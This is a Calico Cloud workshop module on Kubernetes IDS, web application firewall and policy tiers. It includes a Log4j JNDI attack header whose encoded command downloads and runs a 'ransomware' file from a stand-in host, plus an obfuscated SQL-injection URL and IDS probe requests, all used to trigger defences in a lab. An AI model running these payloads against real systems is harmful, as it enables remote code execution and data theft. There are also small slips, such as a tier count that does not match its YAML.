# Module 5 - Configuring IDS protection and Workload-Centric WAF

Security teams need to run DPI quickly in response to unusual network traffic in clusters so they can identify potential threats. Also, it is critical to run DPI on select workloads (not all) to efficiently make use of cluster resources and minimize the impact of false positives. Calico Cloud provides an easy way to perform DPI using Snort community rules. You can disable DPI at any time, selectively configure for namespaces and endpoints, and alerts are generated in the Alerts dashboard in Manager UI.

For this workshop we will enable the IDS for the vote service and observe the alerts being created when trying to expoit some vulnerabilities.

1. First enable the Intrusion Detection

   ```yaml
   kubectl apply -f - <<-EOF
   apiVersion: operator.tigera.io/v1
   kind: IntrusionDetection
   metadata:
     name: tigera-secure
   spec:
     componentResources:
     - componentName: DeepPacketInspection
       resourceRequirements:
         limits:
           cpu: "1"
           memory: 1Gi
         requests:
           cpu: 100m
           memory: 100Mi
   EOF
   ```

2. Next, create a deep packet inspection for the vote application in the vote namespace.

   ```yaml
   kubectl apply -f - <<-EOF
   apiVersion: projectcalico.org/v3
   kind: DeepPacketInspection
   metadata:
     name: dpi-ids-vote
     namespace: vote
   spec:
     selector: app == "vote"
   EOF
   ```

3. Test the IDS emulating an attack to the vote service:

   - Find the IP address of the vote application

     ```bash
     kubectl get svc -n vote 
     ```

   - From your shell, execute the following commands, substituting the xx.xx.xx.xx for the IP address of the vote application.

     ```bash
     curl -m2 http://xx.xx.xx.xx./cmd.exe
     curl -m2 http://xx.xx.xx.xx/NessusTest
     ```

   - Observe the results in the Service Graph. Alerts will be generated warming you about the exploitation attempt.

---

A web application firewall (WAF) protects web applications from a variety of application layer attacks such as cross-site scripting (XSS), SQL injection, and cookie poisoning, among others. Given that attacks on apps are the leading cause of breaches, you need to protect the HTTP traffic that provides a gateway to valuable app data.

Calico Cloud WAF allows you to selectively run service traffic within your cluster, and protect intra-cluster traffic from common HTTP-layer attacks such as SQL injection, and cross-site request forgery. To increase protection, you can use Calico Cloud network policies to enforce security controls on selected pods on the host.

1. Deploy the WAF, by running the following command:

   ```bash
   kubectl apply -f waf
   ```

2. Start a pod to simulate an attack to the vote service.

   ```bash
   kubectl run attacker --image nicolaka/netshoot -it --rm -- /bin/bash
   ```
3. Before protecting the service with the WAF, try the following command from the attacker shell. This will simulate an LOG4J attack.

   ```bash
   curl -v -H \
     'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
     'vote.vote'
   ```

4. Now enable the WAF by using the following command, from your shell (not from the pod attacker).

   ```
   kubectl patch applicationlayer tigera-secure --type='merge' -p '{"spec":{"webApplicationFirewall":"Enabled"}}'
   ```

5. Go back to the attack pod, and repeat the request.

   ```bash
   curl -v -H \
     'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
     'vote.vote'
   ```
   
   You will note that the result will be a HTTP 403 - Forbidden. This returns from the WAF.










  curl http://wordpress.wordpress//test/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user




















Calico eliminates the risks associated with lateral movement in the cluster to prevent access to sensitive data and other assets. Calico provides a unified, cloud-native segmentation model and single policy framework that works seamlessly across multiple application and workload environments. It enables faster response to security threats with a cloud-native architecture that can dynamically enforce security policy changes across cloud environments in milliseconds in response to an attack.

## Security Policy Tiers

Tiers are a hierarchical construct used to group policies and enforce higher precedence policies that other teams cannot circumvent, providing the basis for **Identity-aware microsegmentation**. 

All Calico and Kubernetes security policies reside in tiers. You can start “thinking in tiers” by grouping your teams and the types of policies within each group. The command below will create three tiers (quarantine, platform, and security):

```yaml
kubectl apply -f - <<-EOF   
apiVersion: projectcalico.org/v3
kind: Tier
metadata:
  name: security
spec:
  order: 300
---
apiVersion: projectcalico.org/v3
kind: Tier
metadata:
  name: platform
spec:
  order: 400
EOF
```

Policies are processed in sequential order from top to bottom.

![policy-processing](https://user-images.githubusercontent.com/104035488/206433417-0d186664-1514-41cc-80d2-17ed0d20a2f4.png)

Two mechanisms drive how traffic is processed across tiered policies:

- Labels and selectors
- Policy action rules

For more information about tiers, please refer to the Calico Cloud documentation [Understanding policy tiers](https://docs.calicocloud.io/get-started/tutorials/policy-tiers)

1. Implement explicitic policy to allow egress access from a workload in one namespace/pod, e.g. dev/centos, to default/frontend.
   
   a. Deploy egress policy between two namespaces dev and default.

   ```yaml
   kubectl apply -f - <<-EOF
   apiVersion: projectcalico.org/v3
   kind: NetworkPolicy
   metadata:
     name: platform.centos-to-frontend
     namespace: dev
   spec:
     tier: platform
     order: 300
     selector: app == "centos"
     egress:
       - action: Allow
         protocol: TCP
         source: {}
         destination:
           selector: app == "frontend"
           namespaceSelector: projectcalico.org/name == "default"
       - action: Pass
     ingress:
       - action: Pass  
     types:
       - Egress
       - Ingress
   EOF
   ```

   b. Test connectivity between dev/centos pod and default/frontend service again, should be allowed now.

   ```bash   
   kubectl -n dev exec -t centos -- sh -c 'curl -m3 -sI http://frontend.default 2>/dev/null | grep -i http'
   #output is HTTP/1.1 200 OK

2. Deploy the following security policy for allowing DNS access to all endpoints in the security ties.

  ```yaml
  kubectl apply -f - <<-EOF
  apiVersion: projectcalico.org/v3
  kind: GlobalNetworkPolicy
  metadata:
    name: security.allow-kube-dns
  spec:
    tier: security
    order: 200
    selector: all()
    types:
    - Egress    
    egress:
      - action: Allow
        protocol: UDP
        source: {}
        destination:
          selector: k8s-app == "kube-dns"
          ports:
          - '53'
      - action: Pass
  EOF
  ```

3. Apply the policies to allow the microservices to communicate with each other.

   ```bash
   kubectl apply -f msg
   ```

4. Use the Calico Cloud GUI to enforce the default-deny staged policy. After enforcing a staged policy, it takes effect immediatelly. The default-deny policy will start to actually deny traffic. 

--- 

[:arrow_right: Module 6 - Ingress and Egress access control using NetworkSets](/modules/module-6-network-sets.md)  <br>

[:arrow_left: Module 4 - Workload Access Control](/modules/module-4-workload-access-control.md)  
[:leftwards_arrow_with_hook: Back to Main](/README.md)  
